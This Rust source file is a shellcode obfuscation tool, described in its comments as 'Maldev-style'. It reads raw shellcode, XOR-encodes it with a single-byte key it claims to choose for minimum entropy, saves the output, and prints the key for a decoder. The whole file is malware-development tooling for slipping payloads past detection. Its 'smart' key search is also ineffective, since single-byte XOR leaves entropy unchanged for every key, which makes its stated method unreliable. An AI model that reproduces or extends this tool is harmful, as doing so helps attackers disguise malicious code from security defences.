use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use std::path::Path;
use std::env;
use rand::Rng;

/// Reads raw shellcode from a file
fn read_shellcode(file_path: &str) -> Vec<u8> {
    let mut file = File::open(file_path).expect("Failed to open shellcode file");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer).expect("Failed to read shellcode");
    buffer
}

/// Writes encoded shellcode to a file
fn write_encoded_shellcode(file_path: &str, data: &[u8]) {
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(file_path)
        .expect("Failed to create encoded shellcode file");

    file.write_all(data).expect("Failed to write encoded shellcode");
}

/// Smart XOR encoding (Maldev-style)
/// - Picks an XOR key that minimizes high-entropy output
fn smart_xor_encode(shellcode: &[u8]) -> (Vec<u8>, u8) {
    let mut rng = rand::thread_rng();
    let mut best_key = 0;
    let mut best_encoded = Vec::new();
    let mut min_entropy = f64::MAX;

    for _ in 0..256 {
        let key = rng.gen_range(1..=255); // Avoid XOR with 0
        let encoded: Vec<u8> = shellcode.iter().map(|&b| b ^ key).collect();
        let entropy = calculate_entropy(&encoded);

        if entropy < min_entropy {
            min_entropy = entropy;
            best_key = key;
            best_encoded = encoded;
        }
    }

    (best_encoded, best_key)
}

/// Calculates entropy to evaluate randomness of data
fn calculate_entropy(data: &[u8]) -> f64 {
    let mut freq = [0u32; 256];

    for &byte in data {
        freq[byte as usize] += 1;
    }

    let total = data.len() as f64;
    freq.iter()
        .filter(|&&f| f > 0)
        .map(|&f| {
            let p = f as f64 / total;
            -p * p.log2()
        })
        .sum()
}

fn main() {
    // Get input file from command line arguments
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("❌ Usage: {} <input_shellcode.bin>", args[0]);
        return;
    }

    let input_file = &args[1];
    let output_file = "encoded_shellcode.bin"; // Default output file

    // Read raw shellcode
    let shellcode = read_shellcode(input_file);

    // Encode using Smart XOR
    let (encoded_shellcode, xor_key) = smart_xor_encode(&shellcode);

    // Save encoded shellcode
    write_encoded_shellcode(output_file, &encoded_shellcode);

    println!(
        "✅ Smart XOR Encoding Complete!\n🔑 XOR Key: {}\n📁 Saved as: {}",
        xor_key, output_file
    );

    println!(
        "➡️ Use this XOR key in your decoder: xor_decode(&data, {});",
        xor_key
    );
}
